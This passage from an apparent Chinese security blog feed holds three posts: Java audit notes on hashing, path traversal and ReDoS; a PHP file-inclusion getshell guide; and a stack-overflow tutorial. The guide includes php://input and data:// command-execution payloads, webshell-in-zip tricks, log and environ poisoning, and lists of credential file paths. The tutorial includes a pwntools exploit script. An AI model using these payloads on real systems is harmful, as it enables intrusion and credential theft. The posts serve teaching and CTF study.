class="line">SSLContext.getInstance(&quot;TLS&quot;); </span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://blogs.oracle.com/java-platform-group/entry/diagnosing_tls_ssl_and_https" target="_blank" rel="noopener">Diagnosing TLS, SSL, and HTTPS</a></p><h1 id="习惯使用的信息摘要算法"><a href="#习惯使用的信息摘要算法" class="headerlink" title="习惯使用的信息摘要算法"></a>习惯使用的信息摘要算法</h1><p>自己实现消息摘要算法是不靠谱的。<br><a href="http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html" target="_blank" rel="noopener">NIST</a>建议使用SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, or SHA-512/256。<br><strong>“SHA-1用于生成电子签名：</strong><br>SHA-1可能仅仅用于NIST指导的特殊协议的电子签名的生成。但是在其他的应用中，SHA-1 不应该用于电子签名</p><p><strong>SHA-1用于电子签名的验证：</strong><br>对于电子签名的验证，SHA-1可以被用于传统应用<br><strong>“SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256:</strong><br>所有散列计算程序都支持这些哈希函数的使用。<br>NISI:通信传输：<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">传输中建议使用的加密算法和密钥长度</a><br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MyProprietaryMessageDigest extends MessageDigest &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected byte[] engineDigest() &#123;</span><br><span class="line">        [...]</span><br><span class="line">        //Creativity is a bad idea</span><br><span class="line">        return [...];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>使用其中一种信息摘要算法去升级你的代码。这些算法非常强大，能足够满足你的安全需求。<br>解决方案示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest sha256Digest = MessageDigest.getInstance(&quot;SHA256&quot;);</span><br><span class="line">sha256Digest.update(password.getBytes());</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html" target="_blank" rel="noopener">NIST Approved Hashing Algorithms</a><br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><h1 id="读取文件的缺陷"><a href="#读取文件的缺陷" class="headerlink" title="读取文件的缺陷"></a>读取文件的缺陷</h1><p>漏洞特征： FILE_UPLOAD_FILENAME<br>通过篡改FileUpload API 提供的文件名，客户端可以任意访问系统中的文件<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;../../../config/overide_file&quot;</span><br><span class="line"></span><br><span class="line">&quot;shell.jsp\u0000expected.gif&quot;</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>所以，上面的这些值应该没有做任何过滤就直接进入到了文件系统api之中。如果可能，应用应该生成自己的文件名，并且使用它们。<br>即使这样，被提供的文件名也要去验证它们的有效性，以确保它们没有包含未授权的路径（比如./)和未授权的文件。</p><p>引用：<br><a href="http://blogs.securiteam.com/index.php/archives/1268" target="_blank" rel="noopener">Securiteam: File upload security recommendations</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a><br>[WASC-33: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="正则dos"><a href="#正则dos" class="headerlink" title="正则dos"></a>正则dos</h1><p>漏洞特征： REDOS<br>正则表达式(regexs)经常导致拒绝服务攻击（(DOS)。这是因为当正则表达式引擎分析一些字符串的时候会消耗大量的时间，而这也取决于正则是怎么写的。<br>比如，对于正则<code>^(a+)+$</code>,如果输入”aaaaaaaaaaaaaaaaX”，就会让正则表达式引擎分析65536种不同的路径。<br>所以，可能只要客户端发送一个请求就可以让服务器端消耗巨大的计算资源。问题可能就是类似于这样的正则表达式，由于括号内的+ (or a *)和括号外的+ (or a *) ，当输入相同字符串的时候，可能会有两种不同的处理方式。以这样的方式去写正则，+号会消耗字符’a’。为了修复这样问题，正则表达式应该被重写，目的是消除歧义.比如，上面那个有问题的正则表达式就可以被改写为<code>^a+$</code>，无论如何，这可能是作者的意思。总之，这可能是原来正则表达式的意思，这个新正则表达式会更快的匹配字符串，并且也不会受到ReDos攻击。<br>引用：<br><a href="http://www.jroller.com/sebastianKuebeck/entry/detecting_and_preventing_redos_vulnerabilities" target="_blank" rel="noopener">Sebastian Kubeck’s Weblog: Detecting and Preventing ReDoS Vulnerabilities</a><br>[1] <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">OWASP: Regular expression Denial of Service</a><br><a href="http://cwe.mitre.org/data/definitions/400.html" target="_blank" rel="noopener">CWE-400: Uncontrolled Resource Consumption (‘Resource Exhaustion’)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计-DAY1&quot;&gt;&lt;a href=&quot;#Java审计-DAY1&quot; class=&quot;headerlink&quot; title=&quot;Java审计-DAY1&quot;&gt;&lt;/a&gt;Java审计-DAY1&lt;/h1&gt;&lt;p&gt;本文转载自 &lt;a href=&quot;https://blog.csdn.n
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2019-11-30T12:49:42.000Z</published>
    <updated>2019-12-05T12:02:23.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了</p><p> PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>类型的包含文件时即使遇到错误，下面代码会依然执行</span><br><span class="line"><span class="keyword">include</span>()：</span><br><span class="line"><span class="keyword">include_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br><span class="line">    </span><br><span class="line"><span class="keyword">require</span>类型的包含文件时遇到错误直接退出</span><br><span class="line"><span class="keyword">require</span>()：</span><br><span class="line"><span class="keyword">require_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br></pre></td></tr></table></figure><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul><li><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p><blockquote><p>allow_url_include = On;</p><p>allow_url_fopen 无要求;</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p><blockquote><p>无要求；</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure></li></ul><hr><ul><li><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><blockquote><p>php版本 &gt;= 5.3.0</p></blockquote></li></ul><p>  范例：</p><p>  场景一：文件限定支持上传 zip 等压缩包格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写<code>&lt;?php phpinfo(); ?&gt;</code> 的读取 phpinfo 的 txt (这里也可以直接写一句话木马 shabi.php )。然后添加到压缩包 test.zip 里面并且成功上传，然后通过 phar 就能读出压缩包里面的txt文件并且使其能被执行：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.zip/phpinfo.txt</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure><p>  场景二：文件限定支持上传 jpg 等图片格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写一句话木马 shabi.php ，然后添加到压缩包 test.zip 里面，并且将 test.zip 改名为 test.jpg ，这样就能成功上传并且能通过 phar 读出压缩包里面的一句话木马并且执行：‘</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.jpg/shabi.php</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.jpg/shabi.php</span></span><br></pre></td></tr></table></figure><hr><ul><li><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件</p><blockquote><p>php版本 &gt;= 5.3.0</p><p>需要指定绝对路径</p><p>构造压缩包的方法等同于phar</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//E:/phpStudy/WWW/test.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的 %23 是 # 的url编码</p></blockquote></li></ul><hr><ul><li><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>利用条件</p><blockquote><p>php版本大于等于php5.2</p><p>allow_url_fopen = On</p><p>allow_url_include = On</p></blockquote><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">接收文本执行命令：</span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">接收base64编码文件执行命令:</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b </span><br><span class="line"></span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>%2b 是 + 的url编码，解码后PD9waHAgcGhwaW5mbygpOz8+这串base64串解码后是</p><p> <code>&lt;?php phpinfo();  ?&gt;</code></p><p>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 这串base64串解码后是</p><p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p></blockquote></li></ul><hr><h2 id="日志包含getshell"><a href="#日志包含getshell" class="headerlink" title="日志包含getshell"></a>日志包含getshell</h2><p>当存在文件包含漏洞的时候，我们往往可以通过污染日志并且包含来getshell。</p><p>污染日志的原理就是通过访问一个错误的请求让日志记录下这条记录，我们在访问错误记录时使用代码进行请求，然后再通过文件包含包含出来，就能达到执行的目的了：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E4%BE%8B%E5%AD%90.png" alt></p><p>标上红标的地方改为一句话木马，然后包含出来就能getshell了。</p><blockquote><p>因为浏览器的编码问题，污染日志的一句话可能被自动加上url编码导致包含时会失效。</p><p>解决方法：1、用bp改回参数；2、用curl命令发请求</p></blockquote><p>附上各种能污染的WEB日志的路径：</p><h3 id="Apache日志："><a href="#Apache日志：" class="headerlink" title="Apache日志："></a>Apache日志：</h3><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，error.log的默认路径是在在</p><ul><li>/var/log/apache2/error.log</li></ul><p>下面是其他一般日志的路径</p><ul><li>/var/log/apache/access_log</li><li>/var/www/logs/access_log</li><li>/var/log/access_log</li><li>/var/log/apache2/access.log </li></ul><hr><h3 id="SSH日志："><a href="#SSH日志：" class="headerlink" title="SSH日志："></a>SSH日志：</h3><p>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure><p>然后提示密码输入，随意输入就会登录失败。</p><p>之后在 remotehost 的 ssh-log 中就会出现刚刚登录的php代码，对 ssh-log包含即可执行。</p><hr><h2 id="environ包含getshell"><a href="#environ包含getshell" class="headerlink" title="environ包含getshell"></a>environ包含getshell</h2><p>利用条件：</p><blockquote><p>php以cgi方式运行，这样environ才会保持UA头。</p><p>environ文件存储位置已知，且environ文件可读。</p></blockquote><p>/proc/self/environ： Linux下的当前正在运行的进程的环境变量列表 ，访问能看到里面会有http请求头的信息。于是我们可以通过 user-agent变量进行代码注入，然后通过文件包含来读取并执行代码。</p><p>范例：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/user-agent%E6%B3%A8%E5%85%A5.png" alt></p><blockquote><p>上面例子是反弹了一个shell，我们也可以注普通的一句话</p></blockquote><hr><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>session 文件格式为 sess_[phpsessid] , phpsessid 作为cookie传递，在服务端文件位置会变化</p><p>默认路径是：</p><ul><li>/tmp/(PHP Sessions)</li></ul><p>也可能位于下面路径：</p><ul><li>/var/lib/php/session/(PHP Sessions)</li><li>/var/lib/php5/(PHP Sessions)</li><li>c:/windows/temp/(PHP Sessions)等文件中</li></ul><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇因为期末写了好多天，哎，长路漫漫，漫漫奋斗</p><p>附上敏感文件：</p><p>Linux下：</p><p> ssh免密码登录的秘钥文件等 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys </span><br><span class="line">/root/.ssh/id_rsa </span><br><span class="line">/root/.ssh/id_rsa.keystore </span><br><span class="line">/root/.ssh/id_rsa.pub </span><br><span class="line">/root/.ssh/known_hosts</span><br></pre></td></tr></table></figure><p>加密后的用户口令位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 历史命令 </span><br><span class="line">/root/.bash_history /root/.mysql_history</span><br></pre></td></tr></table></figure><p>进程文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br></pre></td></tr></table></figure><p>检查已经被系统挂载的设备 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts</span><br></pre></td></tr></table></figure><p>机器的内核配置文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure><p>window下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:/boot.ini  //查看系统版本  </span><br><span class="line">C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件  </span><br><span class="line">C:/Windows/repairsam  //存储系统初次安装的密码  </span><br><span class="line">C:/Program Files/mysqlmy.ini  //Mysql配置  </span><br><span class="line">C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root  </span><br><span class="line">C:/Windows/php.ini  //php配置信息  </span><br><span class="line">C:/Windows/my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;p&gt;看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>系统栈和经典栈溢出</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2019-11-30T04:39:05.000Z</published>
    <updated>2019-11-30T08:59:30.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="系统栈和经典栈溢出"><a href="#系统栈和经典栈溢出" class="headerlink" title="系统栈和经典栈溢出"></a>系统栈和经典栈溢出</h1><h3 id="寄存器ebp和esp"><a href="#寄存器ebp和esp" class="headerlink" title="寄存器ebp和esp"></a>寄存器ebp和esp</h3><ul><li><p>寄存器ebp指向  <u>当前的栈帧</u> 的底部（高地址）；</p></li><li><p>寄存器esp指向  <u> 当前的栈帧</u> 的顶部（低地址）；</p></li></ul><h3 id="函数栈帧"><a href="#函数栈帧" class="headerlink" title="函数栈帧"></a>函数栈帧</h3><ul><li>函数返回地址：函数调用前的指令位置；</li><li>栈帧状态值：保存前栈帧的顶部和底部（实际只保存前栈帧的底部，顶部可以通过堆栈平衡计算得出）；</li><li>局部变量：为函数局部变量开辟的内存空间；</li></ul><h3 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h3><ul><li>参数入栈：</li></ul><p>参数从右往左依次压入系统栈中；</p><ul><li>返回地址入栈：</li></ul><p>当前代码区调用的指令的下一条指令地址入栈（call中的压栈）；</p><ul><li>代码区跳转：</li></ul><p>处理器从当前代码区跳转到被调用函数的入口处（call中的跳转）；</p><ul><li>调整栈帧：</li></ul><p>保存当前栈帧状态值 –&gt; ebp入栈（push ebp）；</p><p>将当前栈帧切换到新栈帧 –&gt; esp装入ebp的值，更新栈帧底部 （mov ebp，esp）；</p><p>给新栈帧分配空间 –&gt; 把esp减少所需空间大小，抬高栈顶（sub esp,xxx）；</p><p>对应汇编（假设三个参数）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push 参数2</span><br><span class="line"></span><br><span class="line">push 参数1</span><br><span class="line"></span><br><span class="line">push 参数0  // 至此调用第一步压参数完成</span><br><span class="line"></span><br><span class="line">call 调用地址  // 同时完成第二步和第三步，把下一条指令的地址压栈并跳转</span><br><span class="line"></span><br><span class="line">push ebp  // 保存当前栈</span><br><span class="line"></span><br><span class="line">mov ebp,esp // 设置新栈帧的底部（切换栈帧）</span><br><span class="line"></span><br><span class="line">sub esp，空间大小  // 设置新栈帧的顶部（抬高栈帧）</span><br></pre></td></tr></table></figure><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/push%E5%8F%82%E6%95%B0.png" alt></p><p>上图完成了第一步，把三个参数都压入栈中</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/call.png" alt></p><p>上图完成了第二步和第三步。call操作把下一条指令的地址作为返回地址压入栈，eip跳转到代码区执行</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E4%BF%9D%E5%AD%98%E6%97%A7%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成第四步中保存当前栈的操作，把当前栈的底部压入栈</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%9B%B4%E6%96%B0%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成了第四步里面的更新栈底，把栈顶指针移动到当前栈的最上方</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%BC%80%E8%BE%9F%E7%A9%BA%E9%97%B4.png" alt></p><p>栈顶指针自减上移，开辟了新的栈帧空间。上图到此完成了函数调用过程，形成了上图这样的调用栈</p><ul><li>除了最后一张图，其他图中称ebp为 “当前栈底” 是因为当前还没有通过sub来开辟新的栈帧，所以现在还是处在当前栈帧内。而且现在呈现出来的当前栈的  “底部在头部” 的现象是因为，我们是把当前的栈底的值拿到了顶部进行保存（），而不是改变栈底为栈顶，当前栈 “底部” 依然处在底部；</li><li>最后一张图的 “前栈帧” 是针对刚新开辟的栈帧空间来说的（即图上标注“栈帧空间的部分”），此时的栈帧已经不是上一点注释中的那个了。而且我们能通过前栈帧的ebp（上一点注释中 “位于顶部” 的 “底部”）这个值，定位出前一个栈；</li></ul><blockquote><p>附上一张 x86 系统调用栈（注意下图的栈方向和上面的相反）</p></blockquote><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.jpg" alt></p><h3 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们用以下gcc命令对程序进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example</span><br></pre></td></tr></table></figure><blockquote><p> m32 指的是生成 32 位程序； </p><p>-fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary；</p><p>关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie；</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）； </p></blockquote><p>则目前该程序不开启canary （没有canary导致可以覆盖出栈的空间） 、开启了NX （堆栈不可执行，即使在堆栈中写入shellcode也不能执行）、不开启 PIE 和 ASLR （没有地址随机化，让我们能直接覆盖上success的地址）</p><p>然后我们跟进 vulneravle函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出其栈结构：</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E7%BB%93%E6%9E%84.png" alt></p><p>因为程序里面有shellcode的函数success，我们不需要自己注入shellcode（也因为开启了NX在栈注入shellcode也没用），直接溢出覆盖原返回地址为函数success的地址即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line"><span class="comment">##ida解析出的success的地址</span></span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行该EXP得到结果。</p><h3 id="一般栈溢出做法"><a href="#一般栈溢出做法" class="headerlink" title="一般栈溢出做法"></a>一般栈溢出做法</h3><h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" 